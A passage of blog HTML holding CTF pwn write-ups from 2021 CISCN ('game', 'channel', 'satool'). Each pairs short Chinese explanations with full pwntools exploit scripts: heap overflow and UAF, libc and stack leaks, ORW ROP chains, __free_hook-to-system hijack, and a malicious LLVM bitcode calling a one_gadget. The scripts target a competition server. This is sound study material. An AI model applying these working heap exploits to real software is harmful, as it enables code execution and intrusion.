&quot;</span>)</span><br><span class="line">libc.address = u64(p.recv(6)+<span class="string">&#x27;\x00\x00&#x27;</span>)-0x3ebca0</span><br><span class="line"><span class="built_in">print</span> hex(libc.address)</span><br><span class="line">add(0x28)</span><br><span class="line">add(0x28)</span><br><span class="line">add(0x28)</span><br><span class="line">add(0x68)</span><br><span class="line">free()</span><br><span class="line">edit(p64(libc.sym[<span class="string">&#x27;environ&#x27;</span>])+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(0x68)</span><br><span class="line">add(0x68)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">stack = u64(p.recv(6)+<span class="string">&#x27;\x00\x00&#x27;</span>)-0xf0-0x30</span><br><span class="line"><span class="built_in">print</span> hex(stack)</span><br><span class="line">add(0x78)</span><br><span class="line">free()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rax = 0x0000000000043ae8 + libc.address</span><br><span class="line">pop_rdi = 0x00000000000215bf + libc.address</span><br><span class="line">pop_rsi = 0x0000000000023eea + libc.address</span><br><span class="line">pop_rdx = 0x0000000000001b96 + libc.address</span><br><span class="line">syscall = 0x11B637 + libc.address</span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(2)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(heap + 0x001960)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(4)</span><br><span class="line">payload += p64(pop_rdx)</span><br><span class="line">payload += p64(4)</span><br><span class="line">payload += p64(syscall)<span class="comment">#open</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(0)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(3)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap + 0x1000)</span><br><span class="line">payload1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload1 += p64(pop_rdx)</span><br><span class="line">payload1 += p64(0x100)</span><br><span class="line">payload1 += p64(syscall)<span class="comment">#read</span></span><br><span class="line">payload1 += p64(pop_rax)</span><br><span class="line">payload1 += p64(1)</span><br><span class="line">payload1 += p64(pop_rdi)</span><br><span class="line">payload1 += p64(1)</span><br><span class="line">payload1 += p64(syscall)<span class="comment">#write</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(p64(stack+0x78)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(0x78)</span><br><span class="line">edit(<span class="string">&#x27;./flag\x00\n&#x27;</span>)</span><br><span class="line">add(0x78)</span><br><span class="line">edit(payload1+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(0x78)</span><br><span class="line">free()</span><br><span class="line">edit(p64(stack)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(0x78)</span><br><span class="line">edit(<span class="string">&#x27;./flag\x00\n&#x27;</span>)</span><br><span class="line">add(0x78)</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *$rebase(0x1056)&#x27;)</span></span><br><span class="line">edit(payload+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><p>对玩家进行位移时存在溢出，可以修改下一个chunk的size位，从而实现堆溢出攻击。利用unsortbin泄漏出libc后，申请到environ变量获取栈地址，然后将栈上的返回地址覆盖为ROP串实现ORW即可。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(<span class="string">&quot;./game&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;124.71.230.240&quot;</span>,<span class="string">&quot;26156&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./game1&quot;</span>).libc</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line"></span><br><span class="line">def op(op):</span><br><span class="line">	<span class="built_in">return</span> <span class="string">&quot;op:&quot;</span> + str(op) + <span class="string">&quot;\n&quot;</span></span><br><span class="line">def id(id):</span><br><span class="line">	<span class="built_in">return</span> <span class="string">&quot;id:&quot;</span> + str(id) + <span class="string">&quot;\n&quot;</span></span><br><span class="line">def YMAX(y_max):</span><br><span class="line">	<span class="built_in">return</span> <span class="string">&quot;w:&quot;</span> + str(y_max) + <span class="string">&quot;\n&quot;</span></span><br><span class="line">def XMAX(x_max):</span><br><span class="line">	<span class="built_in">return</span> <span class="string">&quot;l:&quot;</span> + str(x_max) + <span class="string">&quot;\n&quot;</span></span><br><span class="line">def size(size):</span><br><span class="line">	<span class="built_in">return</span> <span class="string">&quot;s:&quot;</span> + str(size) + <span class="string">&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line">def init_game(xmax, ymax):</span><br><span class="line">	line = <span class="string">&quot;&quot;</span></span><br><span class="line">	line += op(1)</span><br><span class="line">	line += XMAX(xmax)</span><br><span class="line">	line += YMAX(ymax)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;cmd&gt;&quot;</span>)</span><br><span class="line">	p.send(line + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">def create_player(_id, _size,data):</span><br><span class="line">	line = <span class="string">&quot;&quot;</span></span><br><span class="line">	line += op(2)</span><br><span class="line">	line += id(_id)</span><br><span class="line">	line += size(_size)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;cmd&gt;&quot;</span>)</span><br><span class="line">	p.send(line + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;desc&gt;&quot;</span>)</span><br><span class="line">	p.send(data)</span><br><span class="line"></span><br><span class="line">def del_player_by_id(_id):</span><br><span class="line">	line = <span class="string">&quot;&quot;</span></span><br><span class="line">	line += op(3)</span><br><span class="line">	line += id(_id)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;cmd&gt;&quot;</span>)</span><br><span class="line">	p.send(line + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">def display_all():</span><br><span class="line">	line = <span class="string">&quot;&quot;</span></span><br><span class="line">	line += op(4)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;cmd&gt;&quot;</span>)</span><br><span class="line">	p.send(line + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">def dec_y_by_id(_id):</span><br><span class="line">	line = <span class="string">&quot;&quot;</span></span><br><span class="line">	line += op(5)</span><br><span class="line">	line += id(_id)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;cmd&gt;&quot;</span>)</span><br><span class="line">	p.send(line + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">def inc_y_by_id(_id):</span><br><span class="line">	line = <span class="string">&quot;&quot;</span></span><br><span class="line">	line += op(6)</span><br><span class="line">	line += id(_id)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;cmd&gt;&quot;</span>)</span><br><span class="line">	p.send(line + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">def dec_x_by_id(_id):</span><br><span class="line">	line = <span class="string">&quot;&quot;</span></span><br><span class="line">	line += op(7)</span><br><span class="line">	line += id(_id)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;cmd&gt;&quot;</span>)</span><br><span class="line">	p.send(line + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">def inc_x_by_id(_id):</span><br><span class="line">	line = <span class="string">&quot;&quot;</span></span><br><span class="line">	line += op(8)</span><br><span class="line">	line += id(_id)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;cmd&gt;&quot;</span>)</span><br><span class="line">	p.send(line + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">init_game(0x4, 8)</span><br><span class="line">create_player(4,0x28,<span class="string">&#x27;nuoye&#x27;</span>)</span><br><span class="line">create_player(1,0x410,<span class="string">&#x27;nuoye&#x27;</span>)</span><br><span class="line">create_player(2,0x420,<span class="string">&#x27;nuoye&#x27;</span>)</span><br><span class="line">create_player(5,0x28,<span class="string">&#x27;nuoye&#x27;</span>)</span><br><span class="line">create_player(6,0x28,<span class="string">&#x27;nuoye&#x27;</span>)</span><br><span class="line">create_player(7,0x28,<span class="string">&#x27;nuoye&#x27;</span>)</span><br><span class="line">del_player_by_id(1)</span><br><span class="line">create_player(1,0x410,<span class="string">&#x27;a&#x27;</span>*8)</span><br><span class="line">display_all()</span><br><span class="line">p.recvuntil(<span class="string">&quot;a&quot;</span>*8)</span><br><span class="line">libc.address  = u64(p.recv(6)+<span class="string">&#x27;\x00\x00&#x27;</span>)-0x3ebca0</span><br><span class="line"><span class="built_in">print</span> hex(libc.address)</span><br><span class="line">inc_y_by_id(2)</span><br><span class="line">inc_y_by_id(2)</span><br><span class="line">del_player_by_id(1)</span><br><span class="line">create_player(1,0x410,<span class="string">&#x27;a&#x27;</span>*(0x1e8)+p64(0x251))</span><br><span class="line"><span class="comment">#del_player_by_id(2)</span></span><br><span class="line">del_player_by_id(6)</span><br><span class="line">del_player_by_id(7)</span><br><span class="line">del_player_by_id(4)</span><br><span class="line">del_player_by_id(5)</span><br><span class="line">del_player_by_id(1)</span><br><span class="line">create_player(1,0x228,b<span class="string">&#x27;\x00&#x27;</span>*0x28+p64(0x31)+p64(libc.sym[<span class="string">&#x27;environ&#x27;</span>]-0x28))</span><br><span class="line">create_player(2,0x228,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">create_player(5,0x228,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">create_player(3,0x28,<span class="string">&#x27;a&#x27;</span>*0x28)</span><br><span class="line">display_all()</span><br><span class="line">p.recvuntil(<span class="string">&quot;a&quot;</span>*0x28)</span><br><span class="line">stack  = u64(p.recv(6)+<span class="string">&#x27;\x00\x00&#x27;</span>) -0x510</span><br><span class="line"><span class="built_in">print</span> hex(stack)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">del_player_by_id(2)</span><br><span class="line">del_player_by_id(5)</span><br><span class="line">del_player_by_id(1)</span><br><span class="line">create_player(1,0x228,b<span class="string">&#x27;\x00&#x27;</span>*0x58+p64(0x31)+p64(stack))</span><br><span class="line">create_player(2,0x228,b<span class="string">&#x27;\x00&#x27;</span>*0x58+p64(0x31)+p64(stack))</span><br><span class="line">create_player(5,0x228,<span class="string">&#x27;./flag\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#create_player(2,0x228,b&#x27;\x00&#x27;*0x58+p64(0x31)+p64(stack))</span></span><br><span class="line"></span><br><span class="line">pop_rax = 0x0000000000043a78 + libc.address</span><br><span class="line">pop_rdi = 0x000000000002155f + libc.address</span><br><span class="line">pop_rsi = 0x0000000000023e8a + libc.address</span><br><span class="line">pop_rdx = 0x0000000000001b96 + libc.address</span><br><span class="line">syscall = 0x11B957 + libc.address</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(2)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(stack + 0xb8)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(4)</span><br><span class="line">payload += p64(pop_rdx)</span><br><span class="line">payload += p64(4)</span><br><span class="line">payload += p64(syscall)<span class="comment">#open</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(0)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(3)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(stack + 0x200)</span><br><span class="line">payload += p64(pop_rdx)</span><br><span class="line">payload += p64(0x100)</span><br><span class="line">payload += p64(syscall)<span class="comment">#read</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(1)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(1)</span><br><span class="line">payload += p64(syscall)<span class="comment">#write</span></span><br><span class="line">payload += <span class="string">&#x27;./flag\x00&#x27;</span></span><br><span class="line">create_player(8,0x228,payload)</span><br><span class="line"><span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">gdb.attach(p,&#x27;</span>b *<span class="variable">$rebase</span>(0x1D74)<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<h2 id="channel"><a href="#channel" class="headerlink" title="channel"></a>channel</h2><p>arm64位的pwn题，静态地址，存在UAF的问题，劫持链表的下一项即可实现任意地址free（需符合size检查）。<br>将tcache结构加入到链表中，再申请一个较小的chunk，即可实现堆溢出，然后劫持到__free_hook，并修改为system函数，即可getshell。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.arch = <span class="string">&#x27;aarch64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#x/20x 0x4000012018</span></span><br><span class="line"><span class="comment">#p = gdb.debug(&#x27;./channel&#x27;,&#x27;b *0x40000010f8&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;124.71.230.240&quot;</span>,<span class="string">&quot;26027&quot;</span>)</span><br><span class="line">def regsiter(key):</span><br><span class="line">	p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;key&gt; &quot;</span>)</span><br><span class="line">	p.send(key)</span><br><span class="line">def unregsiter(key):</span><br><span class="line">	p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;key&gt; &quot;</span>)</span><br><span class="line">	p.send(key)</span><br><span class="line">def show(key):</span><br><span class="line">	p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;key&gt; &quot;</span>)</span><br><span class="line">	p.send(key)</span><br><span class="line">def edit(key,size,data):</span><br><span class="line">	p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;key&gt; &quot;</span>)</span><br><span class="line">	p.send(key)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;len&gt; &quot;</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;content&gt; &quot;</span>)</span><br><span class="line">	p.send(data)</span><br><span class="line">free_got = 0x11F30+0x4000000000</span><br><span class="line">regsiter(<span class="string">&quot;111&quot;</span>)</span><br><span class="line">edit(<span class="string">&quot;111&quot;</span>,0x1f8,b<span class="string">&#x27;2&#x27;</span>*8+b<span class="string">&#x27;\x00&#x27;</span>*0xf8+p64(0x40009bca30)+p64(0x4000011FC8))</span><br><span class="line">edit(<span class="string">&quot;111&quot;</span>,0x1c8,b<span class="string">&#x27;2&#x27;</span>*8+b<span class="string">&#x27;\x00&#x27;</span>*0xf8+p64(0x40009bca30)+p64(0x4000011FC8))</span><br><span class="line">regsiter(<span class="string">&quot;222&quot;</span>)</span><br><span class="line">regsiter(<span class="string">&quot;333&quot;</span>)</span><br><span class="line">unregsiter(<span class="string">&quot;222&quot;</span>)</span><br><span class="line">edit(<span class="string">&quot;111&quot;</span>,0x110,b<span class="string">&#x27;2&#x27;</span>*8+b<span class="string">&#x27;\x00&#x27;</span>*0xf8+p64(0x40009bca30)+p64(0x4000011FC8))</span><br><span class="line">show(<span class="string">&#x27;2&#x27;</span>*8)</span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line">libc_base = u64(p.recv(3).ljust(8,b<span class="string">&#x27;\x00&#x27;</span>))<span class="comment">#+0x4000000000 -0x16E630+0xe8</span></span><br><span class="line">libc_base = 0x4000848000</span><br><span class="line"><span class="built_in">print</span>(hex(libc_base))</span><br><span class="line"><span class="comment">#8f0</span></span><br><span class="line"><span class="comment">#4e0</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">/etc/qemu-binfmt/aarch64/lib/ld-linux-aarch64.so.1</span></span><br><span class="line"><span class="string">/etc/qemu-binfmt/aarch64/lib/libc.so.6</span></span><br><span class="line"><span class="string">&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">edit(<span class="string">&#x27;333&#x27;</span>,0x100,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">unregsiter(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">regsiter(<span class="string">&quot;111&quot;</span>)</span><br><span class="line">regsiter(<span class="string">&quot;222&quot;</span>)</span><br><span class="line">regsiter(<span class="string">&quot;444&quot;</span>)</span><br><span class="line">unregsiter(<span class="string">&quot;222&quot;</span>)</span><br><span class="line">edit(<span class="string">&quot;111&quot;</span>,0x110,b<span class="string">&#x27;2&#x27;</span>*8+b<span class="string">&#x27;\x00&#x27;</span>*0xf8+p64(0x40009bc000)+p64(0x4000011fb8))</span><br><span class="line"></span><br><span class="line">regsiter(<span class="string">&quot;555&quot;</span>)</span><br><span class="line">edit(p64(0)+p64(0x291)+b<span class="string">&#x27;\x00&#x27;</span>*0x1c+p32(0x10000)+b<span class="string">&#x27;\x00&#x27;</span>*0x5c+p64(0x00000),0x20,<span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">show(<span class="string">&#x27;2&#x27;</span>*8)</span><br><span class="line">regsiter(<span class="string">&quot;666&quot;</span>)</span><br><span class="line">unregsiter(<span class="string">&quot;555&quot;</span>)</span><br><span class="line">unregsiter(<span class="string">&quot;666&quot;</span>)</span><br><span class="line">edit(<span class="string">&#x27;444&#x27;</span>,0x100,p64(0)*3+p64(0x100)+p64(libc_base+0x16FC30))</span><br><span class="line">regsiter(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">regsiter(p64(0x40568+libc_base))</span><br><span class="line">unregsiter(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"><span class="comment">#show(&#x27;2&#x27;*8)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<h2 id="satool"><a href="#satool" class="headerlink" title="satool"></a>satool</h2><p>跟2021红帽有点类似，调试出了几个函数save、stealkey、fakekey、run。run可以执行一个指针处的函数，save会为这个指针申请地址，通过特定的申请可以得到unsortbin的，stealkey会将当前的指针的值存储起来，fakekey会将上面存储的值与传入的参数相加。所以可以利用unsortbin泄漏出libc，然后用stealkey保存，fakekey计算偏移到onegadget，最后用run运行即可getshell。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">os.system(<span class="string">&quot;clang -emit-llvm -S exp.c -o exp.bc&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">os.system(&quot;opt -load ./SAPass.so -SAPass ./exp.bc&quot;)</span></span><br><span class="line"><span class="string">p = gdb.debug([&quot;opt&quot;,&#x27;</span>-load<span class="string">&#x27;,&#x27;</span>./SAPass.so<span class="string">&#x27;,&#x27;</span>-SAPass<span class="string">&#x27;,&#x27;</span>./exp.bc<span class="string">&#x27;])</span></span><br><span class="line"><span class="string">p.interactive()</span></span><br><span class="line"><span class="string">&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">ip = <span class="string">&#x27;124.71.230.240&#x27;</span></span><br><span class="line">port = 25989</span><br><span class="line">con = remote(ip, port)</span><br><span class="line">f = open(<span class="string">&quot;./exp.bc&quot;</span>,<span class="string">&quot;rb&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=f.read()</span><br><span class="line"></span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">payload2 = payload.encode(<span class="string">&quot;base64&quot;</span>)</span><br><span class="line">con.sendlineafter(<span class="string">&quot;bitcode: \n&quot;</span>, payload2)</span><br><span class="line"></span><br><span class="line">con.interactive()</span><br></pre></td></tr></table></figure>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">void save(char * a,int b);</span><br><span class="line">void takeaway();</span><br><span class="line">void stealkey();</span><br><span class="line">void fakekey(int a);</span><br><span class="line">void run();</span><br><span class="line"></span><br><span class="line">void <span class="function"><span class="title">B4ckDo0r</span></span>()&#123;</span><br><span class="line">	int a[2];</span><br><span class="line">	a[0]= 0x20;</span><br><span class="line">	a[1] = 2;</span><br><span class="line">	char * b = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">	save(b,0x28);</span><br><span class="line">	save(b,0x28);</span><br><span class="line">	save(b,0x28);</span><br><span class="line">	save(b,0x28);</span><br><span class="line">	save(b,0x28);</span><br><span class="line">	save(b,0x28);</span><br><span class="line">	save(b,0x28);</span><br><span class="line">	save(b,0x28);</span><br><span class="line">	save(b,0x28);</span><br><span class="line">	save(b,0x28);</span><br><span class="line">	stealkey();</span><br><span class="line">	fakekey(0xFFFFFFFFFFC63615+0x16d);</span><br><span class="line">	run();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/06/05/2021CISCN-PWN%E9%A2%98/" data-id="ckpkk65qa00004cu67rbt8phr" data-title="2021CISCN_PWN题" class="article-share-link">分享</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-UAF漏洞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/05/03/UAF%E6%BC%8F%E6%B4%9E/" class="article-date">
-  <time class="dt-published" datetime="2021-05-03T15:20:16.000Z" itemprop="datePublished">2021-05-03</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/05/03/UAF%E6%BC%8F%E6%B4%9E/">UAF漏洞初探</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h2 id="UAF原理"><a href="#UAF原理" class="headerlink" title="UAF原理"></a>UAF原理</h2><p>上代码！！！</p>
